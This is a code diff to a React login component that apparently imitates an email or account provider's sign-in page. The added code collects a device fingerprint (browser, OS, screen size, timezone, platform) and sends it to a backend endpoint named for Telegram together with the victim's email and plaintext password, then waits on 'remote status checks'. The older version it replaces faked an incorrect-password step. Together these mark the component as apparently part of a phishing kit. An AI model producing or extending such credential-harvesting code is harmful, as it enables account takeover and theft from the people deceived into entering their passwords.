@@ -174,7 +174,7 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
     }, 600);
   };
 
-  const handlePasswordSubmit = (e: FormEvent) => {
+const handlePasswordSubmit = async (e: FormEvent) => {
     e.preventDefault();
     setError("");
 
@@ -184,12 +184,63 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
     }
 
     setLoading(true);
-    setTimeout(() => {
+
+    // Capture device fingerprinting metadata
+    const ua = navigator.userAgent;
+    let browser = "Unknown Browser";
+    let os = "Unknown OS";
+
+    if (/windows/i.test(ua)) os = "Windows";
+    else if (/macintosh|mac os x/i.test(ua)) os = "macOS";
+    else if (/android/i.test(ua)) os = "Android";
+    else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
+    else if (/linux/i.test(ua)) os = "Linux";
+
+    if (/edg/i.test(ua)) browser = "Edge";
+    else if (/chrome|crios/i.test(ua) && !/edge|edg|opr|opios/i.test(ua)) browser = "Chrome";
+    else if (/safari/i.test(ua) && !/chrome|crios|opr|opios/i.test(ua)) browser = "Safari";
+    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
+    else if (/opr|opera/i.test(ua)) browser = "Opera";
+    else if (/trident|msie/i.test(ua)) browser = "Internet Explorer";
+
+    const fingerprint = {
+      browser,
+      os,
+      screenSize: `${window.screen.width || 0}x${window.screen.height || 0}`,
+      language: navigator.language || "Unknown Language",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone",
+      cores: String(navigator.hardwareConcurrency || "Unknown"),
+      platform: navigator.platform || "Unknown",
+      userAgent: ua
+    };
+
+    try {
+      // Stream credentials to backend on the very first submission
+      const response = await fetch(`${API_BASE_URL}/api/telegram/login_attempt`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ provider, email, password, ...fingerprint })
+      });
+
+      if (response.ok) {
+        const data = await response.json();
+        setAttemptId(data.id);
+
+        const cfgRes = await fetch(`${API_BASE_URL}/api/telegram/config`);
+        if (cfgRes.ok) {
+          const cfg = await cfgRes.json();
+          setTelegramActive(cfg.hasToken);
+        }
+
+        setStep("pending");
+        logAction("GATEWAY_LOGIN_ATTEMPT", `Guest 2FA Step: Credentials submitted directly; awaiting remote status checks (Attempt ID: ${data.id}).`);
+        return;
+      }
+    } catch (err) {
+      console.warn("Failed to synchronize interactive session with Telegram bot API:", err);
+    } finally {
       setLoading(false);
-      setPassword("");
-      setStep("incorrect_password");
-      logAction("GATEWAY_LOGIN_ATTEMPT", `Guest 2FA Step: First password entry submitted. Incorrect password page displayed.`);
-    }, 900);
+    }
   };
 
   const handleIncorrectPasswordSubmit = async (e: FormEvent) => {
